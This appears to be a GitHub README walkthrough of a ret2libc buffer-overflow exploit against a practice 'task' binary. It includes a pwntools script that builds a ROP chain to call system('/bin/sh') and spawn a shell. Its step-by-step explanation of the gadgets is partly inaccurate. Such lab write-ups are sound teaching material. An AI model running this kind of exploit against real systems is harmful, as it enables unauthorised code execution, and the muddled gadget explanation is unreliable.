# ret2lib C Attack

In this example, we will demonstrate a ret2lib (return-to-library) attack on the `task` binary using a Python exploit. The binary asks the user for their favorite color and then compares it using `strcmp`, creating a vulnerability that allows for a buffer overflow attack.

## File Protections

Before proceeding with the attack, we used `gdb` with `pwndbg` to analyze the file protections of the `task` binary. Here are the relevant protections:

- RELRO: Partial RELRO
- Stack: No canary found
- NX: NX enabled
- PIE: No PIE (0x400000)
- ASLR: Disabled

## Gdb pwndbg

Checking  the Protections

![per](https://github.com/0MrError0/binary-exploit-ret2libc/assets/102399357/bc06461e-b3e8-4f5f-95b2-c03cd90da24f)


![functions](https://github.com/0MrError0/binary-exploit-ret2libc/assets/102399357/54c50d85-b885-4d8f-8231-cdbc16e078f5)

just have the look at Functions Not so UseFull


Finding Offset By cyclic pattern

![cyclic](https://github.com/0MrError0/binary-exploit-ret2libc/assets/102399357/5571f887-9cb5-4552-ad1a-98775c2c4a90)

![offset](https://github.com/0MrError0/binary-exploit-ret2libc/assets/102399357/01a413d0-f4a4-401e-8d37-5a49d820a20f)

Getting system and /bin/sh address

![address](https://github.com/0MrError0/binary-exploit-ret2libc/assets/102399357/e90bd576-20ca-4b6f-98e0-b4f2282bea76)



## Exploiting the Vulnerability

To exploit the buffer overflow vulnerability in the `task` binary, we will use the following Python exploit code:

```python
from pwn import *

elf = context.binary = ELF('./task')

pop_rdi = 0x00000000004012c3
bin_sh = 0x7ffff7f5c031
sys = 0x7ffff7e12330
ret = 0x000000000040101a

payload = cyclic(24) + pack(pop_rdi) + pack(bin_sh) + pack(ret) + pack(sys)

io = process('./task')
io.sendline(payload)
io.interactive()
```

Having determined the offset, we can now proceed with the exploitation of the vulnerability.

1. Jump over the `rdi` registers: As `rdi` is used to pass the first argument to functions in x86_64 calling convention, we need to jump over it to avoid any issues. This step ensures that we don't disrupt the function flow when executing subsequent instructions.

2. Load the address of `/bin/sh`: We need the address of the `/bin/sh` string to execute a shell. By loading its address into a register, we can use it as an argument for the `system` function later on.

3. Jump to the return address: After loading the address of `/bin/sh`, we need to jump to the return address in the `task` binary. This allows us to control the flow of execution and redirect it to our desired instructions.

4. Jump to the `system` address: Finally, we jump to the address of the `system` function. This will execute the `system("/bin/sh")` command, spawning a shell with root privileges.

## Conclusion

By exploiting the buffer overflow vulnerability in the `task` binary with ASLR turned off, we were able to achieve arbitrary code execution and spawn a shell with root privileges. It is important to note that this attack should only be performed for educational purposes on systems you have explicit permission to test.

Please exercise caution and ensure compliance with local laws and regulations when performing any security-related activities.

Happy Hacking!
